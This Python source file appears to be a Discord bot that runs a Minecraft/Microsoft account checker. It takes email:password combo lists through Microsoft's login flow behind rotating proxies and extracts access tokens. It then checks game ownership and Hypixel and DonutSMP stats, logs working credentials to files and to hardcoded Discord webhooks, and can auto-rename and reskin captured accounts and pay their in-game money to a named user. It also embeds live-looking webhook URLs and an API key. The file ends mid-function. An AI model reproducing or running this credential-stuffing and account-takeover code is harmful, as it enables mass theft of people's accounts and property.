#!/usr/bin/env python3
"""
Discord Bot – alpha restocker (FIXED VPS VERSION)
Commands: $check, $cui, $stop, $thread, $delay, $set_logchannel,
          $set_logs_hits, $set_webhook, $second_webhook, $disable_secondwebhook,
          $emojis, $auth, $unauth, $listauth, $setup, $help
"""

import discord
from discord.ext import commands
import asyncio
import aiohttp
import configparser
import json
import os
import re
import time
import threading
import concurrent.futures
import requests
import urllib3
import random
from io import BytesIO
from urllib.parse import urlparse, parse_qs
from pathlib import Path
import sys
import uuid
import socket
import socks
from datetime import datetime, timezone
import warnings
import traceback
import string
from http.cookiejar import MozillaCookieJar
from bs4 import BeautifulSoup
import cloudscraper
from colorama import Fore, Style, init

# from minecraft.networking.connection import Connection
# from minecraft.authentication import AuthenticationToken, Profile
# from minecraft.networking.packets import clientbound
# from minecraft.exceptions import LoginDisconnect

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
init(autoreset=True)

# ==================================================================
# CONFIGURATION – EDIT THESE LINES
# ==================================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_IDS = [1495759462416257145, 765053626942619688]          # List of owner IDs
BOT_AVATAR_URL = "https://media.tenor.com/7s1y1-vWb9wAAAAC/sigma.gif"

# Log channel ID – set manually or via $set_logchannel
LOG_CHANNEL_ID = None   # Replace with integer channel ID if you want a fixed channel

# Original hardcoded webhook (kept for backward compatibility)
DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1502114102741303378/vpVw27pgZfan81rs5QSNQZWqr9Ty-9wuNfBABtAYgNr3ldJbnC8cVOdwWrW-QMe7KOxh"

def is_owner(ctx):
    return ctx.author.id in OWNER_IDS

# ==================================================================
# Discord Bot Setup – Modern UI
# ==================================================================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="$", intents=intents, help_command=None)

# Global state
active_session = None

custom_emojis = {
    "minecraft": None, "gamepass": None, "ultimate": None,
    "validmail": None, "check_start": None, "status": None,
    "complete": None, "stop": None,
}

def get_emoji(category):
    if custom_emojis.get(category):
        return custom_emojis[category]
    fallbacks = {
        "minecraft": "⛏️", "gamepass": "🎮", "ultimate": "👑", "validmail": "📧",
        "check_start": "🚀", "status": "📊", "complete": "🎉", "stop": "⏹️",
    }
    return fallbacks.get(category, "⚡")

async def send_modern_embed(ctx, title, description=None, fields=None, color=0xE63946, thumbnail=None, footer=None):
    embed = discord.Embed(title=title, description=description, color=color)
    if thumbnail:
        embed.set_thumbnail(url=thumbnail)
    if fields:
        for name, value, inline in fields:
            embed.add_field(name=name, value=value, inline=inline)
    footer_text = footer or "Restocker by ALPHA • Red Theme"
    embed.set_footer(text=footer_text, icon_url=BOT_AVATAR_URL if BOT_AVATAR_URL else None)
    await ctx.send(embed=embed)

async def upload_emojis_to_guild(guild):
    emoji_urls = {
        "minecraft": "https://cdn.discordapp.com/emojis/1086189678744256562.png",
        "gamepass": "https://cdn.discordapp.com/emojis/1086189682736177223.png",
        "ultimate": "https://cdn.discordapp.com/emojis/1086189675437563944.png",
        "validmail": "https://cdn.discordapp.com/emojis/1086189677922627635.png",
        "check_start": "https://cdn.discordapp.com/emojis/1086189677200879646.gif",
        "status": "https://cdn.discordapp.com/emojis/1086189683438137354.png",
        "complete": "https://cdn.discordapp.com/emojis/1086189679735676968.gif",
        "stop": "https://cdn.discordapp.com/emojis/1086189680593801247.gif",
    }
    async with aiohttp.ClientSession() as session:
        for name, url in emoji_urls.items():
            try:
                async with session.get(url, timeout=10, ssl=False) as resp:
                    if resp.status == 200:
                        img_data = await resp.read()
                        existing = discord.utils.get(guild.emojis, name=name)
                        if existing:
                            custom_emojis[name] = str(existing)
                            continue
                        emoji = await guild.create_custom_emoji(name=name, image=img_data)
                        custom_emojis[name] = str(emoji)
                        await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Failed to upload {name}: {e}")
    return custom_emojis

# ==================================================================
# Configuration for checker (config.ini)
# ==================================================================
CONFIG_DIR_BOT = Path("config")
CONFIG_DIR_BOT.mkdir(exist_ok=True)
AUTH_FILE = CONFIG_DIR_BOT / "authorized.json"
BOT_SETTINGS_FILE = CONFIG_DIR_BOT / "settings.ini"

DEFAULT_BOT_CONFIG = {
    "General": {
        "threads": "20",
        "timeout": "30",
        "max_retries": "5",
        "delay": "1.0",           # seconds between each combo check
        "log_channel_id": "",
        "hits_log_channel_id": "",
    },
    "Webhooks": {
        "hits_webhook": "https://discord.com/api/webhooks/1502099684695740428/M_jMjTLM2c4w2Th0VBNUXgGcE2IXbTAqXXr0lnn48e2x15phrvjzN9Eaw78waylx6aCm",
        "banned_webhook": "https://discord.com/api/webhooks/1502099684695740428/M_jMjTLM2c4w2Th0VBNUXgGcE2IXbTAqXXr0lnn48e2x15phrvjzN9Eaw78waylx6aCm",
        "unbanned_webhook": "https://discord.com/api/webhooks/1502099684695740428/M_jMjTLM2c4w2Th0VBNUXgGcE2IXbTAqXXr0lnn48e2x15phrvjzN9Eaw78waylx6aCm",
        "second_hits_webhook": "",   # new: optional secondary webhook
    }
}

def load_bot_config():
    cfg = configparser.ConfigParser()
    if not BOT_SETTINGS_FILE.exists():
        cfg.read_dict(DEFAULT_BOT_CONFIG)
        with open(BOT_SETTINGS_FILE, "w") as f:
            cfg.write(f)
    else:
        cfg.read(BOT_SETTINGS_FILE)
        updated = False
        for section, keys in DEFAULT_BOT_CONFIG.items():
            if not cfg.has_section(section):
                cfg.add_section(section)
                updated = True
            for key, value in keys.items():
                if not cfg.has_option(section, key):
                    cfg.set(section, key, value)
                    updated = True
        if updated:
            with open(BOT_SETTINGS_FILE, "w") as f:
                cfg.write(f)
    return cfg

def save_bot_config(cfg):
    with open(BOT_SETTINGS_FILE, "w") as f:
        cfg.write(f)

bot_config = load_bot_config()

def load_authorized():
    if AUTH_FILE.exists():
        with open(AUTH_FILE) as f:
            return json.load(f)
    return []

def save_authorized(auth_list):
    with open(AUTH_FILE, "w") as f:
        json.dump(auth_list, f, indent=2)

# Helper to get log channel from config
def get_log_channel():
    global LOG_CHANNEL_ID
    if LOG_CHANNEL_ID is not None:
        return bot.get_channel(LOG_CHANNEL_ID)
    cfg_id = bot_config["General"].get("log_channel_id", "")
    if cfg_id and cfg_id.isdigit():
        return bot.get_channel(int(cfg_id))
    return None

# Helper for hits log channel
def get_hits_log_channel():
    cfg_id = bot_config["General"].get("hits_log_channel_id", "")
    if cfg_id and cfg_id.isdigit():
        return bot.get_channel(int(cfg_id))
    return None

# ==================================================================
# DEMON KING CHECKER CORE (original logic, adapted)
# ==================================================================
DONUTSMP_API_KEY = "1a5487cf06ef44c982dfb92c3a8ba0eb"
HYPIXEL_API_KEY = "YOUR_HYPIXEL_API_KEY_HERE"
NEW_SKIN_URL = "https://cdn.discordapp.com/attachments/1389074941307125817/1389162427261648927/God.png"

UNBAN_EMOJI = "✅"

logo = Fore.RED+'''
██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║
██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║
██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

██╗  ██╗██╗███╗   ██╗ ██████╗
██║ ██╔╝██║████╗  ██║██╔════╝
█████╔╝ ██║██╔██╗ ██║██║  ███╗
██╔═██╗ ██║██║╚██╗██║██║   ██║
██║  ██╗██║██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝
                                   
                              \n'''

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

# Global stats
hits = bad = twofa = errors = retries = checked = vm = sfa = mfa = xgp = xgpu = other = cpm = cpm1 = 0
Combos = []
proxylist = []
banproxies = []
current_fname = ""
results_dir = None

def format_number(num):
    try:
        num = int(num)
        if num >= 1000000000: return f"{num/1000000000:.1f}B"
        elif num >= 1000000: return f"{num/1000000:.1f}M"
        elif num >= 1000: return f"{num/1000:.1f}K"
        else: return str(num)
    except: return "N/A"

def format_time(seconds):
    try:
        seconds = int(seconds)
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        minutes = (seconds % 3600) // 60
        if days > 0: return f"{days}d {hours}h {minutes}m"
        elif hours > 0: return f"{hours}h {minutes}m"
        else: return f"{minutes}m"
    except: return "N/A"

class DemonKingConfig:
    def __init__(self): self.data = {}
    def set(self, k, v): self.data[k] = v
    def get(self, k): return self.data.get(k)

demonking_cfg = DemonKingConfig()
maxretries_checker = 5

def load_demonking_config():
    global maxretries_checker
    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')
    default_config = {
        'Settings': {'Webhook': 'paste your discord webhook here', 'Embed': True, 'Max Retries': 5, 'Proxyless Ban Check': False, 'Use Different Proxies To Ban Check': False, 'WebhookMessage': '@everyone HIT: ||`<email>:<password>`||\nName: <name>\nAccount Type: <type>\nHypixel: <hypixel>\nHypixel Level: <level>\nFirst Hypixel Login: <firstlogin>\nLast Hypixel Login: <lastlogin>\nOptifine Cape: <ofcape>\nMC Capes: <capes>\nEmail Access: <access>\nHypixel Skyblock Coins: <skyblockcoins>\nHypixel Bedwars Stars: <bedwarsstars>\nBanned: <banned>\nCan Change Name: <namechange>\nLast Name Change: <lastchanged>'},
        'Scraper': {'Auto Scrape Minutes': 5},
        'Auto': {'Set Name': True, 'Name': 'mythic', 'Set Skin': True, 'Skin': NEW_SKIN_URL, 'Skin Variant': 'classic'},
        'Captures': {
            'Hypixel Name': True, 'Hypixel Level': True, 'First Hypixel Login': True, 'Last Hypixel Login': True,
            'Optifine Cape': True, 'Minecraft Capes': True, 'Email Access': True, 'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True, 'Hypixel Ban': True, 'Name Change Availability': True, 'Last Name Change': True,
            'Payment': True, 'Hypixel Karma': True
        },
        'DonutSMP': {
            'DonutSMP Name': True, 'DonutSMP Rank': True, 'DonutSMP Level': True, 'DonutSMP Balance': True,
            'DonutSMP Playtime': True, 'DonutSMP Kills': True, 'DonutSMP Deaths': True, 'DonutSMP Blocks Broken': True,
            'DonutSMP Blocks Placed': True, 'DonutSMP Shards': True, 'DonutSMP Base Found': True, 'DonutSMP Location': True,
            'DonutSMP Mobs Killed': True, 'DonutSMP Money Spent': True, 'DonutSMP Money Made': True, 'DonutSMP Banned Check': True
        },
        'AutoPay': {'Enabled': True, 'PayUser': 'xLor3dy_'}
    }
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        for section, values in default_config.items():
            c[section] = values
        with open('config.ini', 'w') as cf:
            c.write(cf)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    config_updated = False
    for section, values in default_config.items():
        if section not in read_config:
            read_config[section] = values
            config_updated = True
        else:
            for k, v in values.items():
                if k not in read_config[section]:
                    read_config[section][k] = str(v)
                    config_updated = True
    if config_updated:
        with open('config.ini', 'w') as cf:
            read_config.write(cf)
    maxretries_checker = int(read_config['Settings']['Max Retries'])
    demonking_cfg.set('webhook', str(read_config['Settings']['Webhook']))
    demonking_cfg.set('embed', str_to_bool(read_config['Settings']['Embed']))
    demonking_cfg.set('message', str(read_config['Settings']['WebhookMessage']))
    demonking_cfg.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
    demonking_cfg.set('differentproxy', str_to_bool(read_config['Settings']['Use Different Proxies To Ban Check']))
    demonking_cfg.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    demonking_cfg.set('setname', str_to_bool(read_config['Auto']['Set Name']))
    demonking_cfg.set('name', str(read_config['Auto']['Name']))
    demonking_cfg.set('setskin', str_to_bool(read_config['Auto']['Set Skin']))
    demonking_cfg.set('skin', str(read_config['Auto']['Skin']))
    demonking_cfg.set('variant', str(read_config['Auto']['Skin Variant']))
    demonking_cfg.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
    demonking_cfg.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
    demonking_cfg.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
    demonking_cfg.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
    demonking_cfg.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    demonking_cfg.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    demonking_cfg.set('access', str_to_bool(read_config['Captures']['Email Access']))
    demonking_cfg.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
    demonking_cfg.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
    demonking_cfg.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
    demonking_cfg.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    demonking_cfg.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
    demonking_cfg.set('payment', str_to_bool(read_config['Captures']['Payment']))
    demonking_cfg.set('hypixelkarma', str_to_bool(read_config['Captures'].get('Hypixel Karma', 'True')))
    demonking_cfg.set('autopay', str_to_bool(read_config['AutoPay'].get('Enabled', 'True')))
    demonking_cfg.set('pay_user', read_config['AutoPay'].get('PayUser', 'xLor3dy_'))

load_demonking_config()

class BotProxyManager:
    def __init__(self):
        self.proxies = []
        self.type = "none"
    def load_from_file(self, file_path, proxy_type):
        self.proxies = []
        self.type = proxy_type
        try:
            with open(file_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        self.proxies.append(line)
            return len(self.proxies)
        except:
            return 0
    def get_proxy(self):
        if not self.proxies or self.type == "none":
            return None
        proxy = random.choice(self.proxies)
        if self.type == "http":
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        elif self.type == "socks4":
            return {'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'}
        elif self.type == "socks5":
            return {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
        return None

bot_proxy_manager = BotProxyManager()

def getproxy():
    return bot_proxy_manager.get_proxy()

# ---------- Authentication functions (original, fully working) ----------
def get_urlPost_sFTTag(session):
    global retries
    while True:
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            text = session.get(sFTTag_url, headers=headers, timeout=30, verify=False).text
            match = re.search(r'name="PPFT".*?value="(.+?)"', text, re.S) or \
                    re.search(r'sFTTag:[\'"](.+?)[\'"]', text, re.S) or \
                    re.search(r'value=\\\"?(.+?)\\\"?', text, re.S)
            if match:
                sFTTag = match.group(1).replace('\\"', '').replace('"', '')
                match = re.search(r'["\']urlPost["\']\s*:\s*["\'](.+?)["\']', text, re.S) or \
                        re.search(r'<form.*?action="(.+?)"', text, re.S)
                if match:
                    urlPost = match.group(1).replace('&amp;', '&')
                    return urlPost, sFTTag, session
        except Exception:
            pass
        session.proxies = getproxy()
        retries += 1
        time.sleep(2)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries
    for tries in range(maxretries_checker):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=30)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                ipt = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group()
                pprid = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group()
                uaid = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                action = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                ret = session.post(action, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt=", "help us protect your account"]):
                twofa += 1
                checked += 1
                cpm += 1
                with open(f"results/{current_fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "2fa", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "tried to sign in too many times with an incorrect account or password"]):
                bad += 1
                checked += 1
                cpm += 1
                return "bad", session
            else:
                session.proxies = getproxy()
                retries += 1
                time.sleep(1)
        except Exception:
            session.proxies = getproxy()
            retries += 1
            time.sleep(2 ** tries)
    bad += 1
    checked += 1
    cpm += 1
    return "bad", session

def mc_token(session, uhs, xsts_token):
    global retries
    for _ in range(maxretries_checker):
        try:
            mc = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=30)
            if mc.status_code == 429:
                session.proxies = getproxy()
                time.sleep(20)
                continue
            else:
                return mc.json().get('access_token')
        except:
            retries += 1
            session.proxies = getproxy()
            time.sleep(2)
            continue
    return None

def checkownership(entitlements_response):
    items = entitlements_response.get("items", [])
    has_normal_minecraft = False
    has_game_pass_pc = False
    has_game_pass_ultimate = False
    for item in items:
        name = item.get("name", "")
        source = item.get("source", "")
        if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"):
            has_normal_minecraft = True
        if name == "product_game_pass_pc":
            has_game_pass_pc = True
        if name == "product_game_pass_ultimate":
            has_game_pass_ultimate = True
    if has_normal_minecraft and has_game_pass_pc:
        return "Normal Minecraft (with Game Pass)"
    if has_normal_minecraft and has_game_pass_ultimate:
        return "Normal Minecraft (with Game Pass Ultimate)"
    elif has_normal_minecraft:
        return "Normal Minecraft"
    elif has_game_pass_ultimate:
        return "Xbox Game Pass Ultimate"
    elif has_game_pass_pc:
        return "Xbox Game Pass (PC)"
    return None

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type_, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type_
        self.session = session
        self.hypixl = self.level = self.firstlogin = self.lastlogin = self.cape = self.access = None
        self.sbcoins = self.bwstars = self.banned = self.namechanged = self.lastchanged = self.karma = None
        self.donutsmp = self.donutsmp_rank = self.donutsmp_level = self.donutsmp_balance = None
        self.donutsmp_playtime = self.donutsmp_kills = self.donutsmp_deaths = self.donutsmp_blocks_broken = None
        self.donutsmp_blocks_placed = self.donutsmp_shards = self.donutsmp_base_found = None
        self.donutsmp_location = self.donutsmp_mobs_killed = self.donutsmp_money_spent = None
        self.donutsmp_money_made = self.donutsmp_banned = None

    def donutsmp_stats(self):
        global errors
        try:
            scraper = cloudscraper.create_scraper()
            headers = {'User-Agent': 'Mozilla/5.0', 'Authorization': f'Bearer {DONUTSMP_API_KEY}'}
            r = scraper.get(f'https://api.donutsmp.net/v1/lookup/{self.name}', headers=headers, timeout=20)
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 200 and data.get('result'):
                    self.donutsmp = "Yes (Online)"
                    self.donutsmp_rank = data['result'].get('rank', 'N/A')
                    self.donutsmp_location = data['result'].get('location', 'N/A')
                else:
                    self.donutsmp = "No"
            elif r.status_code == 500:
                try:
                    err = r.json()
                    if err.get('message') == "This user is not currently online.":
                        self.donutsmp = "Yes (Offline)"
                    else:
                        self.donutsmp = "Error"
                except:
                    self.donutsmp = "Error"
            else:
                self.donutsmp = "Error"
            
            sr = scraper.get(f'https://api.donutsmp.net/v1/stats/{self.name}', headers=headers, timeout=20)
            if sr.status_code == 200:
                sd = sr.json()
                if sd.get('status') == 200 and sd.get('result'):
                    pd = sd['result']
                    self.donutsmp_balance = format_number(pd.get('money', 'N/A'))
                    self.donutsmp_playtime = format_time(pd.get('playtime', 0))
                    self.donutsmp_kills = format_number(pd.get('kills', 'N/A'))
                    self.donutsmp_deaths = format_number(pd.get('deaths', 'N/A'))
                    self.donutsmp_blocks_broken = format_number(pd.get('broken_blocks', 'N/A'))
                    self.donutsmp_blocks_placed = format_number(pd.get('placed_blocks', 'N/A'))
                    self.donutsmp_shards = format_number(pd.get('shards', 'N/A'))
                    self.donutsmp_mobs_killed = format_number(pd.get('mobs_killed', 'N/A'))
                    self.donutsmp_money_spent = format_number(pd.get('money_spent_on_shop', 'N/A'))
                    self.donutsmp_money_made = format_number(pd.get('money_made_from_sell', 'N/A'))
        except Exception as e:
            errors += 1
            self.donutsmp = "Error"

    def check_donut_ban(self):
        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Authorization': f'Bearer {DONUTSMP_API_KEY}'}
            r = requests.get(f'https://api.donutsmp.net/v1/lookup/{self.name}', headers=headers, timeout=20, verify=False)
            if r.status_code == 500:
                try:
                    err = r.json()
                    if err.get('message') == "This user is not currently online.":
                        self.donutsmp_banned = "False"
                    else:
                        self.donutsmp_banned = "True"
                except:
                    self.donutsmp_banned = "True"
                with open(f"results/{current_fname}/DonutBanned.txt", 'a') as f:
                    f.write(f"{self.email}:{self.password}\n")
            elif r.status_code == 200:
                self.donutsmp_banned = "False"
                with open(f"results/{current_fname}/DonutUnbanned.txt", 'a') as f:
                    f.write(f"{self.email}:{self.password}\n")
            else:
                self.donutsmp_banned = "Unknown"
        except:
            self.donutsmp_banned = "Unknown"

    def hypixel_api(self):
        global errors
        if not (demonking_cfg.get('hypixelname') or demonking_cfg.get('hypixellevel') or demonking_cfg.get('hypixelfirstlogin') or demonking_cfg.get('hypixellastlogin') or demonking_cfg.get('hypixelbwstars') or demonking_cfg.get('hypixelsbcoins') or demonking_cfg.get('hypixelkarma')):
            return
        if not self.uuid or self.uuid == 'N/A':
            return
        try:
            url = f"https://api.hypixel.net/v2/player?uuid={self.uuid.replace('-', '')}"
            headers = {'User-Agent': 'Mozilla/5.0', 'API-Key': HYPIXEL_API_KEY}
            resp = requests.get(url, proxies=getproxy(), headers=headers, timeout=30, verify=False)
            if resp.status_code != 200:
                return
            data = resp.json()
            if not data.get('success') or not data.get('player'):
                return
            player = data['player']
            if demonking_cfg.get('hypixelname'):
                self.hypixl = player.get('displayname', 'N/A')
            if demonking_cfg.get('hypixellevel'):
                level = player.get('networkLevel')
                if level is None:
                    exp = player.get('networkExp', 0)
                    import math
                    level = (math.sqrt(exp + 15312.5) - 123.5) / 17.5
                    level = max(1, int(level))
                self.level = str(level)
            if demonking_cfg.get('hypixelfirstlogin'):
                first = player.get('firstLogin')
                if first:
                    dt = datetime.fromtimestamp(first/1000, tz=timezone.utc)
                    self.firstlogin = dt.strftime("%Y-%m-%d %H:%M:%S UTC")
            if demonking_cfg.get('hypixellastlogin'):
                last = player.get('lastLogin')
                if last:
                    dt = datetime.fromtimestamp(last/1000, tz=timezone.utc)
                    self.lastlogin = dt.strftime("%Y-%m-%d %H:%M:%S UTC")
            if demonking_cfg.get('hypixelkarma'):
                karma = player.get('karma')
                if karma:
                    self.karma = format_number(karma)
                else:
                    self.karma = "0"
            if demonking_cfg.get('hypixelbwstars'):
                stats = player.get('stats', {})
                bw = stats.get('Bedwars', {})
                lvl = bw.get('level')
                if lvl:
                    self.bwstars = str(int(lvl))
                else:
                    self.bwstars = "N/A"
            if demonking_cfg.get('hypixelsbcoins'):
                try:
                    sb_url = f"https://api.hypixel.net/v2/skyblock/profiles?uuid={self.uuid.replace('-', '')}"
                    sb_resp = requests.get(sb_url, headers=headers, proxies=getproxy(), timeout=30, verify=False)
                    if sb_resp.status_code == 200:
                        sb_data = sb_resp.json()
                        if sb_data.get('success') and sb_data.get('profiles'):
                            for profile in sb_data['profiles']:
                                if profile.get('selected'):
                                    members = profile.get('members', {})
                                    member = members.get(self.uuid.replace('-', ''))
                                    if member:
                                        coins = member.get('coin_purse', 0)
                                        self.sbcoins = format_number(coins)
                                        break
                except:
                    pass
        except Exception as e:
            errors += 1

    def hypixel_ban_check(self):
        global errors
        if not demonking_cfg.get('hypixelban', True): return
        if not self.name or self.name == 'N/A': return
        try:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            connection = Connection("hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
            
            @connection.listener(clientbound.login.DisconnectPacket, early=True)
            def login_disconnect(packet):
                data = json.loads(str(packet.json_data))
                reason_text = ""
                if 'extra' in data and isinstance(data['extra'], list):
                    for comp in data['extra']:
                        if isinstance(comp, dict) and 'text' in comp:
                            reason_text += comp['text']
                else:
                    reason_text = data.get('text', str(data))
                
                if "Suspicious activity" in reason_text:
                    ban_id = data['extra'][6].get('text', '').strip() if 'extra' in data and len(data['extra']) > 6 else ""
                    self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                elif "temporarily banned" in reason_text:
                    duration = data['extra'][4].get('text', '').strip() if 'extra' in data and len(data['extra']) > 4 else ""
                    ban_id = data['extra'][8].get('text', '').strip() if 'extra' in data and len(data['extra']) > 8 else ""
                    self.banned = f"{duration} {reason_text} Ban ID: {ban_id}"
                elif "You are permanently banned from this server!" in reason_text:
                    reason = data['extra'][2].get('text', '').strip() if 'extra' in data and len(data['extra']) > 2 else ""
                    ban_id = data['extra'][6].get('text', '').strip() if 'extra' in data and len(data['extra']) > 6 else ""
                    self.banned = f"[Permanently] {reason} Ban ID: {ban_id}"
                elif "The Hypixel Alpha server is currently closed!" in reason_text or "Failed cloning your SkyBlock data" in reason_text:
                    self.banned = "False"
                else:
                    self.banned = reason_text if reason_text else "Unknown ban reason"
                
                if self.banned != "False":
                    with open(f"results/{current_fname}/Banned.txt", 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
                    self.save_cookies('Banned')
                else:
                    with open(f"results/{current_fname}/Unbanned.txt", 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
                    self.save_cookies('Unbanned')
            
            @connection.listener(clientbound.play.DisconnectPacket, early=True)
            def play_disconnect(packet):
                login_disconnect(packet)
            
            @connection.listener(clientbound.play.JoinGamePacket, early=True)
            def joined_server(packet):
                if self.banned is None:
                    self.banned = "False"
                    with open(f"results/{current_fname}/Unbanned.txt", 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
                    self.save_cookies('Unbanned')
                connection.disconnect()
            
            try:
                if len(banproxies) > 0:
                    proxy = random.choice(banproxies)
                    if '@' in proxy:
                        atsplit = proxy.split('@')
                        socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                    else:
                        ip_port = proxy.split(':')
                        socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                    socket.socket = socks.socksocket
                from io import StringIO
                original_stderr = sys.stderr
                sys.stderr = StringIO()
                try:
                    connection.connect()
                    c = 0
                    while self.banned is None and c < 1000:
                        time.sleep(.01)
                        c+=1
                    connection.disconnect()
                except:
                    pass
                sys.stderr = original_stderr
            except:
                pass
        except Exception as e:
            errors += 1
            if self.banned is None:
                self.banned = f'[Error] Exception: {str(e)[:50]}'

    def builder(self):
        msg = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl: msg += f"\nHypixel: {self.hypixl}"
        if self.level: msg += f"\nHypixel Level: {self.level}"
        if self.firstlogin: msg += f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin: msg += f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape: msg += f"\nOptifine Cape: {self.cape}"
        if self.access: msg += f"\nEmail Access: {self.access}"
        if self.sbcoins: msg += f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars: msg += f"\nHypixel Bedwars Stars: {self.bwstars}"
        if self.karma: msg += f"\nHypixel Karma: {self.karma}"
        if demonking_cfg.get('hypixelban'): msg += f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged: msg += f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged: msg += f"\nLast Name Change: {self.lastchanged}"
        if self.donutsmp: msg += f"\nDonutSMP: {self.donutsmp}"
        if self.donutsmp_banned: msg += f"\nDonutSMP Banned: {self.donutsmp_banned}"
        if self.donutsmp_rank: msg += f"\nDonutSMP Rank: {self.donutsmp_rank}"
        if self.donutsmp_balance: msg += f"\nDonutSMP Balance: ${self.donutsmp_balance}"
        if self.donutsmp_playtime: msg += f"\nDonutSMP Playtime: {self.donutsmp_playtime}"
        if self.donutsmp_kills: msg += f"\nDonutSMP Kills: {self.donutsmp_kills}"
        if self.donutsmp_deaths: msg += f"\nDonutSMP Deaths: {self.donutsmp_deaths}"
